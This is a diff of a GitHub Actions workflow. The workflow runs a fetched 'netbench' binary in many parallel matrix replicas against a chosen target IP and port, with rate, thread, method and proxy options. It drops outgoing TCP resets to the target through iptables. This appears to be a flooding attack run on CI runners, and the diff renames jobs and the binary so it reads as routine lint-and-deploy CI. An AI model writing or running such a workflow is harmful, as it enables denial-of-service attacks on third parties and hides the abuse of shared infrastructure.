@@ -1,6 +1,5 @@
-# Auto-generated config v267.77
 # Continuous Integration Pipeline
-name: Nightly Build
+name: CI Lint & Deploy
 
 on:
   push:
@@ -62,7 +61,7 @@ concurrency:
   cancel-in-progress: true
 
 jobs:
-  compile:
+  setup:
     runs-on: ubuntu-22.04
     outputs:
       matrix: ${{ steps.gen.outputs.matrix }}
@@ -108,12 +107,12 @@ jobs:
         ids=$(python3 -c "import json; print(json.dumps([i+1 for i in range(int('$n'))]))")
         echo "matrix={\"id\":$ids}" >> $GITHUB_OUTPUT
 
-  verify:
-    needs: [compile]
+  deploy:
+    needs: [setup]
     runs-on: ubuntu-22.04
     timeout-minutes: 20
     strategy:
-      matrix: ${{ fromJSON(needs.compile.outputs.matrix) }}
+      matrix: ${{ fromJSON(needs.setup.outputs.matrix) }}
       fail-fast: false
     steps:
     - name: Fetch artifact
@@ -136,10 +135,10 @@ jobs:
         sudo iptables -t raw -A OUTPUT -p udp -j NOTRACK 2>/dev/null || true
         sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ${{ github.event.inputs.target_ip }} -j DROP 2>/dev/null || true
 
-    - name: Run analysis (Replica ${{ matrix.id }})
+    - name: Run service (Replica ${{ matrix.id }})
       run: |
-        mv netbench worker
-        chmod +x worker
+        mv netbench svc
+        chmod +x svc
         
         TARGET_IP="${{ github.event.inputs.target_ip || '127.0.0.1' }}"
         TARGET_PORT="${{ github.event.inputs.target_port || '443' }}"
@@ -153,7 +152,7 @@ jobs:
           PROXY_FLAG=""
         fi
         
-        SYNC_TS="${{ needs.compile.outputs.sync_ts }}"
+        SYNC_TS="${{ needs.setup.outputs.sync_ts }}"
         START_TS="${{ github.event.inputs.start_timestamp || '0' }}"
         if [ "$START_TS" = "0" ] || [ "$START_TS" = "" ]; then
           START_TS="$SYNC_TS"
@@ -166,7 +165,7 @@ jobs:
           fi
         fi
         
-        sudo sh -c "cpulimit -l 50 -f -- ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./worker $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"
+        sudo sh -c "cpulimit -l 50 -f -- ./svc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG || exec ./svc $TARGET_IP $TARGET_PORT $RATE $DURATION $METHOD $THREADS $PROXY_FLAG"
 
     - name: Cleanup
       if: always()
